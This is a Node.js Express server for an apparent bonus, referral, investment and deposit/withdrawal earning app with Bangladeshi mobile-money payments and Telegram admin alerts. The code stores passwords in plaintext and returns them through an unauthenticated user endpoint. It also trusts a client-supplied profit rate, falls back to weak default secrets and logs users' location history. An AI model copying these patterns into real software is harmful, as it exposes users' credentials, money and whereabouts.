const express = require("express");
const path = require("path");
const fs = require("fs");
const crypto = require("crypto");
require("dotenv").config();

const app = express();
const PORT = Number(process.env.PORT || 3000);
const ADMIN_PIN = String(process.env.ADMIN_PIN || "6123");
const APP_SECRET = String(process.env.APP_SECRET || "change-this-secret");

const DATA_DIR = path.join(__dirname, "data");
const DB_FILE = path.join(DATA_DIR, "db.json");
fs.mkdirSync(DATA_DIR, { recursive: true });

let fileLockPromise = Promise.resolve();
function withFileLock(operation) {
  const result = fileLockPromise.then(() => operation());
  fileLockPromise = result.catch(() => {});
  return result;
}

function defaultDb() {
  return {
    registrations: [],
    usedNumbers: [],
    usedTrxIds: [],
    withdrawals: [],
    investments: [],
    deposits: [],
    transactions: [],
    promoTimers: {},
    promoTasks: [
      { id: "promo_1", title: "YouTube Promo Visit", url: "https://youtube.com", requiredTime: 10, reward: 45 }
    ],
    settings: {
      noticeText: "📢 Professional V2 লাইভ হয়েছে! সকল নতুন ফিচারে বোনাস উপভোগ করুন।",
      noticeActive: true,
      adminBkash: "01700000000",
      adminNagad: "01800000000",
      depositEnabled: true,
      reqRefs: 3,
      refBonus: 50,
      investRate: 15,
      minInvest: 100,
      telegramChatId: "",
      telegramBotTokenEncrypted: ""
    }
  };
}

function loadDb() {
  try {
    if (!fs.existsSync(DB_FILE)) {
      const db = defaultDb();
      fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
      return db;
    }
    const parsed = JSON.parse(fs.readFileSync(DB_FILE, "utf8"));
    return {
      registrations: Array.isArray(parsed.registrations) ? parsed.registrations : [],
      usedNumbers: Array.isArray(parsed.usedNumbers) ? parsed.usedNumbers : [],
      usedTrxIds: Array.isArray(parsed.usedTrxIds) ? parsed.usedTrxIds : [],
      withdrawals: Array.isArray(parsed.withdrawals) ? parsed.withdrawals : [],
      investments: Array.isArray(parsed.investments) ? parsed.investments : [],
      deposits: Array.isArray(parsed.deposits) ? parsed.deposits : [],
      transactions: Array.isArray(parsed.transactions) ? parsed.transactions : [],
      promoTimers: parsed.promoTimers || {},
      promoTasks: Array.isArray(parsed.promoTasks) ? parsed.promoTasks : defaultDb().promoTasks,
      settings: { ...defaultDb().settings, ...(parsed.settings || {}) }
    };
  } catch {
    return defaultDb();
  }
}

function saveDb(db) {
  const tmp = DB_FILE + ".tmp";
  fs.writeFileSync(tmp, JSON.stringify(db, null, 2));
  fs.renameSync(tmp, DB_FILE);
}

function clean(v, max = 200) { return String(v || "").trim().slice(0, max); }

function key() { return crypto.createHash("sha256").update(APP_SECRET).digest(); }

function encryptSecret(value) {
  if (!value) return "";
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv("aes-256-gcm", key(), iv);
  const enc = Buffer.concat([cipher.update(String(value), "utf8"), cipher.final()]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([iv, tag, enc]).toString("base64");
}

function decryptSecret(value) {
  if (!value) return "";
  try {
    const raw = Buffer.from(value, "base64");
    const iv = raw.subarray(0, 12);
    const tag = raw.subarray(12, 28);
    const data = raw.subarray(28);
    const decipher = crypto.createDecipheriv("aes-256-gcm", key(), iv);
    decipher.setAuthTag(tag);
    return Buffer.concat([decipher.update(data), decipher.final()]).toString("utf8");
  } catch { return ""; }
}

async function sendTelegram(text) {
  const db = loadDb();
  const token = decryptSecret(db.settings.telegramBotTokenEncrypted);
  const chatId = db.settings.telegramChatId;
  if (!token || !chatId) return { ok: false, error: "Missing config" };
  try {
    const resp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text })
    });
    const data = await resp.json();
    return { ok: data.ok };
  } catch (err) { return { ok: false, error: err.message }; }
}

function signSession(payload) {
  const body = Buffer.from(JSON.stringify(payload)).toString("base64url");
  const sig = crypto.createHmac("sha256", APP_SECRET).update(body).digest("base64url");
  return `${body}.${sig}`;
}

function verifySession(token) {
  try {
    const [body, sig] = String(token || "").split(".");
    if (!body || !sig) return null;
    const expected = crypto.createHmac("sha256", APP_SECRET).update(body).digest("base64url");
    if (sig !== expected) return null;
    return JSON.parse(Buffer.from(body, "base64url").toString("utf8"));
  } catch { return null; }
}

function cookies(req) {
  const out = {};
  for (const part of (req.headers.cookie || "").split(";")) {
    const i = part.indexOf("=");
    if (i > -1) out[part.slice(0, i).trim()] = decodeURIComponent(part.slice(i + 1).trim());
  }
  return out;
}

function requireAdmin(req, res, next) {
  const session = verifySession(cookies(req).admin_session);
  if (!session || session.role !== "admin") return res.status(401).json({ error: "Unauthorized" });
  next();
}

app.use(express.json({ limit: "100kb" }));
app.use(express.static(path.join(__dirname, "public")));

// Public Settings API
app.get("/api/settings", (req, res) => {
  const db = loadDb();
  res.json({
    ok: true,
    settings: {
      noticeText: db.settings.noticeText,
      noticeActive: db.settings.noticeActive,
      adminBkash: db.settings.adminBkash,
      adminNagad: db.settings.adminNagad,
      depositEnabled: db.settings.depositEnabled,
      reqRefs: db.settings.reqRefs,
      refBonus: db.settings.refBonus,
      investRate: db.settings.investRate,
      minInvest: db.settings.minInvest
    }
  });
});

// Registration & Login APIs
app.post("/api/register/start", (req, res) => {
  withFileLock(async () => {
    const { name, phone, password, age, location } = req.body;
    const db = loadDb();
    if (db.registrations.some(r => r.phone === phone)) {
      return res.status(409).json({ error: "এই নাম্বার দিয়ে ইতিপূর্বে অ্যাকাউন্ট খোলা হয়েছে।" });
    }

    const id = crypto.randomUUID();
    const user = {
      id, name, phone, password, age,
      balance: 100, totalEarned: 100,
      referralCode: "REF" + Math.floor(100000 + Math.random() * 900000),
      referredBy: null, referralCount: 0, referralClaimed: false,
      completedPromoTasks: [],
      location, locationHistory: [location], status: "awaiting_payment",
      createdAt: new Date().toISOString()
    };

    db.registrations.unshift(user);
    db.transactions.unshift({ id: crypto.randomUUID(), userId: id, type: "Registration Bonus", amount: 100, status: "Success", date: new Date().toISOString() });
    saveDb(db);
    res.json({ ok: true, user });
  });
});

app.post("/api/login", (req, res) => {
  const { phone, password } = req.body;
  const db = loadDb();
  const user = db.registrations.find(r => r.phone === phone && r.password === password);
  if (!user) return res.status(401).json({ error: "Invalid Information" });
  res.json({ ok: true, user });
});

app.get("/api/user/:id", (req, res) => {
  const db = loadDb();
  const user = db.registrations.find(r => r.id === req.params.id);
  if (!user) return res.status(404).json({ error: "User not found" });
  res.json({ ok: true, user });
});

app.post("/api/user/:id/location", (req, res) => {
  withFileLock(async () => {
    const db = loadDb();
    const user = db.registrations.find(r => r.id === req.params.id);
    if (!user) return res.status(404).json({ error: "User not found" });
    const loc = req.body?.location;
    if(loc) {
      user.location = loc;
      if(!Array.isArray(user.locationHistory)) user.locationHistory = [];
      user.locationHistory.push({ ...loc, capturedAt: new Date().toISOString() });
      saveDb(db);
    }
    res.json({ ok: true });
  });
});

app.post("/api/register/:id/payment", (req, res) => {
  withFileLock(async () => {
    const db = loadDb();
    const user = db.registrations.find(r => r.id === req.params.id);
    if (!user) return res.status(404).json({ error: "User not found" });
    user.status = "complete";
    saveDb(db);
    sendTelegram(`✅ New User Registered: ${user.name} (${user.phone})`);
    res.json({ ok: true, user });
  });
});

// 1. Deposit API with TrxID Uniqueness Check
app.post("/api/deposit", (req, res) => {
  withFileLock(async () => {
    const { userId, method, amount, trxId } = req.body;
    const db = loadDb();
    if (!db.settings.depositEnabled) return res.status(400).json({ error: "ডিপোজিট সিস্টেম বর্তমানে বন্ধ রয়েছে।" });

    const user = db.registrations.find(r => r.id === userId);
    if (!user) return res.status(404).json({ error: "User not found" });

    const cleanTrx = clean(trxId, 50).toUpperCase();
    const numAmt = Number(amount);

    if (numAmt < 100) return res.status(400).json({ error: "সর্বনিম্ন ডিপোজিট ৳১০০" });
    if (db.usedTrxIds.includes(cleanTrx) || db.deposits.some(d => d.trxId === cleanTrx)) {
      return res.status(400).json({ error: "এই Transaction ID টি ইতিপূর্বে ব্যবহার করা হয়েছে! দ্বিতীয়বার ব্যবহার নিষিদ্ধ।" });
    }

    db.usedTrxIds.push(cleanTrx);
    const depositId = crypto.randomUUID();

    db.deposits.unshift({
      id: depositId, userId, userName: user.name, userPhone: user.phone,
      method, amount: numAmt, trxId: cleanTrx, status: "Pending", createdAt: new Date().toISOString()
    });

    db.transactions.unshift({
      id: crypto.randomUUID(), userId, type: `Deposit (${method})`, amount: numAmt, status: "Pending", date: new Date().toISOString()
    });

    saveDb(db);
    sendTelegram(`💳 New Deposit Request: ৳${numAmt} via ${method} (TrxID: ${cleanTrx}) from ${user.name}`);
    res.json({ ok: true });
  });
});

// 2. Referral Claim API
app.post("/api/referral/claim", (req, res) => {
  withFileLock(async () => {
    const { userId } = req.body;
    const db = loadDb();
    const user = db.registrations.find(r => r.id === userId);
    if (!user) return res.status(404).json({ error: "User not found" });

    if (user.referralClaimed) return res.status(400).json({ error: "Claim Not Available: ইতিমধ্যে ক্লেম করা হয়েছে।" });
    if ((user.referralCount || 0) < db.settings.reqRefs) return res.status(400).json({ error: "Claim Not Available: যোগ্যতা পূরণ হয়নি।" });

    const bonus = db.settings.refBonus;
    user.balance += bonus;
    user.totalEarned += bonus;
    user.referralClaimed = true;

    db.transactions.unshift({ id: crypto.randomUUID(), userId, type: "Referral Bonus Claim", amount: bonus, status: "Success", date: new Date().toISOString() });
    saveDb(db);
    res.json({ ok: true, balance: user.balance, reward: bonus });
  });
});

// 3. Investment API
app.post("/api/invest", (req, res) => {
  withFileLock(async () => {
    const { userId, planDays, profitPercent, amount } = req.body;
    const db = loadDb();
    const user = db.registrations.find(r => r.id === userId);

    if (!user || user.balance < amount || amount < db.settings.minInvest) {
      return res.status(400).json({ error: "Insufficient Balance" });
    }

    user.balance -= amount;
    db.investments.unshift({ id: crypto.randomUUID(), userId, planDays, profitPercent, amount, status: "Active", createdAt: new Date().toISOString() });
    db.transactions.unshift({ id: crypto.randomUUID(), userId, type: `Investment Plan (${planDays} Days)`, amount: -amount, status: "Success", date: new Date().toISOString() });

    saveDb(db);
    res.json({ ok: true, balance: user.balance });
  });
});

// 4. Secure Promo Tasks APIs (Server-side timer validation)
app.get("/api/promo/tasks", (req, res) => {
  const db = loadDb();
  res.json({ tasks: db.promoTasks });
});

app.post("/api/promo/start", (req, res) => {
  withFileLock(async () => {
    const { userId, taskId } = req.body;
    const db = loadDb();
    if(!db.promoTimers) db.promoTimers = {};
    db.promoTimers[`${userId}_${taskId}`] = Date.now();
    saveDb(db);
    res.json({ ok: true });
  });
});

app.post("/api/promo/verify", (req, res) => {
  withFileLock(async () => {
    const { userId, taskId } = req.body;
    const db = loadDb();
    const user = db.registrations.find(r => r.id === userId);
    const task = db.promoTasks.find(t => t.id === taskId);

    if (!user || !task) return res.status(400).json({ error: "Task Failed" });
    if (!Array.isArray(user.completedPromoTasks)) user.completedPromoTasks = [];
    if (user.completedPromoTasks.includes(taskId)) return res.status(400).json({ error: "Claim Not Available: ইতিমধ্যে সম্পন্ন হয়েছে।" });

    const timerKey = `${userId}_${taskId}`;
    const startTime = db.promoTimers[timerKey];
    if (!startTime || (Date.now() - startTime) < (task.requiredTime * 1000)) {
      return res.status(400).json({ error: "Task Failed: নির্ধারিত সময় পূর্ণ হয়নি।" });
    }

    user.completedPromoTasks.push(taskId);
    user.balance += task.reward;
    user.totalEarned += task.reward;
    delete db.promoTimers[timerKey];

    db.transactions.unshift({ id: crypto.randomUUID(), userId, type: `Promo Task (${task.title})`, amount: task.reward, status: "Success", date: new Date().toISOString() });
    saveDb(db);
    res.json({ ok: true, balance: user.balance, reward: task.reward });
  });
});

// Transactions & Withdraw
app.get("/api/transactions/:userId", (req, res) => {
  const db = loadDb();
  const txs = db.transactions.filter(t => t.userId === req.params.userId);
  res.json({ ok: true, transactions: txs });
});

app.post("/api/withdraw", (req, res) => {
  withFileLock(async () => {
    const { userId, method, number, amount } = req.body;
    const db = loadDb();
    const user = db.registrations.find(r => r.id === userId);

    if (!user || user.balance < amount || amount < 500) {
      return res.status(400).json({ error: "Insufficient Balance" });
    }

    user.balance -= amount;
    db.withdrawals.unshift({ id: crypto.randomUUID(), userId, userName: user.name, method, number, amount, status: "Pending", createdAt: new Date().toISOString() });
    db.transactions.unshift({ id: crypto.randomUUID(), userId, type: `Withdraw Request (${method})`, amount: -amount, status: "Pending", date: new Date().toISOString() });

    saveDb(db);
    sendTelegram(`💸 Withdrawal Request: ৳${amount} via ${method} by ${user.name}`);
    res.json({ ok: true, balance: user.balance });
  });
});

// Admin APIs
app.post("/api/admin/login", (req, res) => {
  if (String(req.body?.pin || "") !== ADMIN_PIN) return res.status(401).json({ error: "Invalid PIN" });
  const token = signSession({ role: "admin", exp: Date.now() + 8*3600*1000 });
  res.setHeader("Set-Cookie", `admin_session=${token}; HttpOnly; Path=/; Max-Age=28800`);
  res.json({ ok: true });
});

app.post("/api/admin/logout", (req, res) => {
  res.setHeader("Set-Cookie", "admin_session=; HttpOnly; Path=/; Max-Age=0");
  res.json({ ok: true });
});

app.get("/api/admin/data", requireAdmin, (req, res) => {
  const db = loadDb();
  res.json({
    registrations: db.registrations,
    withdrawals: db.withdrawals,
    deposits: db.deposits,
    total: db.registrations.length,
    bkashCount: db.registrations.filter(r => r.paymentMethod === "bKash").length,
    nagadCount: db.registrations.filter(r => r.paymentMethod === "Nagad").length
  });
});

app.post("/api/admin/deposit/update", requireAdmin, (req, res) => {
  withFileLock(async () => {
    const { depositId, status } = req.body;
    const db = loadDb();
    const dep = db.deposits.find(d => d.id === depositId);
    if (!dep || dep.status === "Approved") return res.status(400).json({ error: "Invalid request" });

    dep.status = status;
    const user = db.registrations.find(r => r.id === dep.userId);
    const tx = db.transactions.find(t => t.userId === dep.userId && t.type.includes("Deposit") && t.amount === dep.amount && t.status === "Pending");

    if (status === "Approved" && user) {
      user.balance += dep.amount;
      user.totalEarned += dep.amount;
      if (tx) tx.status = "Success";
    } else if (status === "Rejected" && tx) {
      tx.status = "Rejected";
    }

    saveDb(db);
    res.json({ ok: true });
  });
});

app.post("/api/admin/withdraw/update", requireAdmin, (req, res) => {
  withFileLock(async () => {
    const { withdrawId, status } = req.body;
    const db = loadDb();
    const wd = db.withdrawals.find(w => w.id === withdrawId);
    if (!wd) return res.status(404).json({ error: "Not found" });

    wd.status = status;
    const user = db.registrations.find(r => r.id === wd.userId);
    const tx = db.transactions.find(t => t.userId === wd.userId && t.type.includes("Withdraw") && t.amount === -wd.amount && t.status === "Pending");

    if (status === "Rejected" && user) {
      user.balance += wd.amount;
      if (tx) tx.status = "Rejected";
    } else if (status === "Approved" && tx) {
      tx.status = "Success";
    }

    saveDb(db);
    res.json({ ok: true });
  });
});

app.get("/api/admin/settings", requireAdmin, (req, res) => {
  const db = loadDb();
  res.json({ ...db.settings, promoTasks: db.promoTasks, hasTelegramBotToken: Boolean(db.settings.telegramBotTokenEncrypted) });
});

app.post("/api/admin/settings", requireAdmin, (req, res) => {
  withFileLock(async () => {
    const db = loadDb();
    const { telegramBotToken, ...rest } = req.body;
    db.settings = { ...db.settings, ...rest };
    if (telegramBotToken) {
      db.settings.telegramBotTokenEncrypted = encryptSecret(telegramBotToken);
    }
    saveDb(db);
    res.json({ ok: true });
  });
});

app.post("/api/admin/promo/create", requireAdmin, (req, res) => {
  withFileLock(async () => {
    const { title, url, requiredTime, reward } = req.body;
    const db = loadDb();
    db.promoTasks.push({ id: "promo_" + Date.now(), title, url, requiredTime: Number(requiredTime), reward: Number(reward) });
    saveDb(db);
    res.json({ ok: true });
  });
});

app.post("/api/admin/promo/delete", requireAdmin, (req, res) => {
  withFileLock(async () => {
    const { id } = req.body;
    const db = loadDb();
    db.promoTasks = db.promoTasks.filter(t => t.id !== id);
    saveDb(db);
    res.json({ ok: true });
  });
});

app.post("/api/admin/telegram/test", requireAdmin, async (req, res) => {
  const result = await sendTelegram("🔔 Test Message: Professional V2 Telegram Configured Successfully!");
  if (!result.ok) return res.status(400).json({ error: result.error || "Failed" });
  res.json({ ok: true });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
